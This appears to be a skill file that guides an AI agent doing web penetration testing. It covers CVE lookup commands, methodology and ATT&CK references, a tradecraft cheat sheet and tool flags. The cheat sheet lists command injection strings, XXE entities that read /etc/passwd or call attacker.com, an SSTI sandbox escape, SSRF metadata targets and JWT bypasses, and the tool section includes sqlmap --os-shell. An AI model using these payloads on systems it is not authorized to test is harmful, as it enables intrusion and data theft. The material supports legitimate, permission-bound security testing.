---
name: knowledge-broker
description: Cyber Knowledge Broker — Unified surface for CVE/vulnerability intelligence, vulnerability methodology (OWASP/PTES/MITRE), tradecraft techniques, exploit signals, and tool documentation. Use when researching CVEs, looking up vulnerability intel, finding methodology guidance, learning tradecraft for specific attack classes, or checking installed tool versions and flags.
---

# CYBER KNOWLEDGE BROKER

**One surface for all security intelligence. Route every research question through this skill.**

---

## 1. VULNERABILITY INTELLIGENCE

### CVE Lookup

```bash
# Search by CVE ID
curl -s "https://cve.circl.lu/api/cve/CVE-2024-1234" | jq .

# NVD API (no key required, rate limited)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=apache+struts" | jq .

# CISA Known Exploited Vulnerabilities (KEV)
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" | jq '.vulnerabilities[] | select(.cveID == "CVE-2024-1234")'

# Exploit-DB
searchsploit apache struts 2.5
searchsploit --cve 2024-1234
```

### Component applicability

For each lead record the primary advisory URL, retrieval date, actual package,
affected/fixed range, required feature/configuration, attacker privileges,
reachable input and decisive test. A fingerprint is a lead, not vulnerability
proof. Backported patches and downstream packages require their own evidence.
A widely used component is not inherently more vulnerable. Prefer the vendor's
advisory and patch/regression test to copied version-to-CVE tables.

Do not translate a memory-safety advisory into a production crash test without
explicit permission for that effect. Prefer supplied source and an isolated
replica when validating fragile or disruptive prerequisites.

### KEV/EPSS enrichment

Use exploitation intelligence to order applicable, permitted work after checking
reachability and prerequisites. KEV inclusion, EPSS and CVSS describe different
things; none establishes that this target is vulnerable or authorizes a test.
Record the retrieval date and distinguish likelihood information from observed
impact. Never derive bounty severity or a mandatory exploit decision from an
EPSS threshold alone.

---

## 2. METHODOLOGY LOOKUP

### OWASP Web Security Testing Guide (WSTG)

Use the official guide at https://owasp.org/www-project-web-security-testing-guide/.
Select relevant identity, authentication, authorization, session, input handling,
configuration, client-side and business-logic tests from the observed surface.
Record the guide version and exact identifier from that version when citing a
test. Do not invent sequential WSTG IDs or imply a generic checklist is a coverage
result. Track applicability and evidence in `investigation-control`.

### MITRE ATT&CK for Enterprise

```
RELEVANT MITRE TECHNIQUES FOR WEB PENTEST:

Initial Access:
  T1189: Drive-by Compromise
  T1190: Exploit Public-Facing Application
  T1199: Trusted Relationship
  T1133: External Remote Services

Execution:
  T1059: Command and Scripting Interpreter
  T1203: Exploitation for Client Execution

Persistence:
  T1098: Account Manipulation
  T1078: Valid Accounts

Privilege Escalation:
  T1068: Exploitation for Privilege Escalation
  T1078: Valid Accounts

Defense Evasion:
  T1027: Obfuscated Files or Information
  T1070: Indicator Removal

Credential Access:
  T1003: OS Credential Dumping
  T1110: Brute Force
  T1557: Adversary-in-the-Middle

Discovery:
  T1046: Network Service Scanning
  T1083: File and Directory Discovery

Lateral Movement:
  T1021: Remote Services
  T1550: Use Alternate Authentication Material

Collection:
  T1005: Data from Local System
  T1039: Data from Network Shared Drive

Exfiltration:
  T1041: Exfiltration Over C2 Channel
  T1567: Exfiltration Over Web Service

Impact:
  T1485: Data Destruction
  T1486: Data Encrypted for Impact
  T1489: Service Stop
```

---

## 3. TRADECRAFT LOOKUP

### By Attack Class

```
TRADECRAFT: IDOR
- Sequential IDs → change by ±1
- UUIDs → find from other endpoints (email invites, sharing links)
- Indirect references → change in POST body
- HTTP method confusion → test GET/PUT/POST/DELETE on same path
- GraphQL node IDs → decode base64, change, re-encode

TRADECRAFT: XSS
- Reflected → inject in URL params, check response
- Stored → inject in form, check when rendered
- DOM → check JS sources for sink functions (innerHTML, eval, document.write)
- Mutation XSS → test with <noscript>, <textarea>, <title> contexts
- CSP bypass → find open redirect, use as script source

TRADECRAFT: SQLi
- Error-based → inject quote, look for SQL errors
- Union-based → determine column count with ORDER BY
- Blind boolean → compare responses with true/false conditions
- Blind time → SLEEP/pg_sleep/WAITFOR DELAY
- Out-of-band → DNS/HTTP callback via LOAD_FILE or xp_cmdshell

TRADECRAFT: SSRF
- Direct URL parameter → inject internal IPs
- Cloud metadata → 169.254.169.254, metadata.google.internal
- IP bypass → decimal, octal, hex, IPv6, DNS rebinding
- Redirect chain → external URL 302s to internal
- File upload URL → import from internal URL

TRADECRAFT: AUTH BYPASS
- Missing auth → access endpoint without token
- Method confusion → GET protected, POST unprotected
- Path confusion → /admin vs /Admin vs /admin/ vs /./admin
- Parameter pollution → ?role=user&role=admin
- JWT none algorithm → remove signature, set alg to "none"
- JWT key confusion → use public key as HMAC secret

TRADECRAFT: COMMAND INJECTION
- Semicolon → ; whoami
- Pipe → | whoami
- Backticks → `whoami`
- Dollar parens → $(whoami)
- Logical operators → || whoami, && whoami
- Newline → %0a whoami
- Time-based → ; sleep 5

TRADECRAFT: XXE
- Basic → <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- Blind → <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
- Error-based → <!ENTITY xxe SYSTEM "file:///nonexistent">
- Parameter entity → <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;

TRADECRAFT: SSTI
- Jinja2/Twig → {{7*7}} → 49
- Freemarker → ${7*7} → 49
- ERB → <%= 7*7 %> → 49
- sandbox escape → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

TRADECRAFT: OPEN REDIRECT
- Parameter manipulation → ?next=https://evil.com
- Double URL encoding → ?url=https%3A%2F%2Fevil.com
- Protocol confusion → //evil.com, /\evil.com
- Backslash → /target.com\@evil.com
- Tab/newline → /target.com%09.evil.com
```

---

## 4. TOOL DOCUMENTATION

### Tool Availability Matrix

```
TOOL            STATUS      PURPOSE                     INSTALL
═══════════════════════════════════════════════════════════════════════
subfinder       Required    Subdomain enumeration       go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
httpx           Required    HTTP probing                go install github.com/projectdiscovery/httpx/cmd/httpx@latest
nuclei          Required    Template-based scanning     go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nmap            Required    Port scanning               apt install nmap / brew install nmap
ffuf            Required    Directory fuzzing           go install github.com/ffuf/ffuf/v2@latest
sqlmap          Required    SQL injection testing       apt install sqlmap / brew install sqlmap
katana          Recommended Web crawling                go install github.com/projectdiscovery/katana/cmd/katana@latest
dnsx            Recommended DNS resolution              go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
naabu           Recommended Port scanning (fast)        go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
dalfox          Recommended XSS testing                 go install github.com/hahwul/dalfox/v2@latest
gobuster        Optional    Directory fuzzing           apt install gobuster
nikto           Optional    Web server scanning         apt install nikto
amass           Optional    Subdomain enumeration       apt install amass
```

### Tool Flag Reference

```bash
# subfinder — all flags
subfinder -d TARGET -all -o subs.txt -silent -timeout 30

# httpx — useful flags
httpx -l resolved.txt -sc -title -tech-detect -cdn -follow-redirects -o alive.txt -json

# nuclei — useful flags
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei.txt -json
nuclei -u TARGET -t ~/nuclei-templates/http/vulnerabilities/ -v

# nmap — useful flags
nmap -sV -sC -T4 -p- -oA nmap_full TARGET
nmap -sU -T4 --top-ports 100 -oA nmap_udp TARGET

# ffuf — useful flags
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -o fuzz.json
ffuf -u https://TARGET/FUZZ -w wordlist.txt -H "Authorization: Bearer TOKEN" -fc 403

# sqlmap — useful flags
sqlmap -u "https://TARGET/?id=1" --batch --dbs --threads 5
sqlmap -u "https://TARGET/?id=1" --batch --os-shell
```
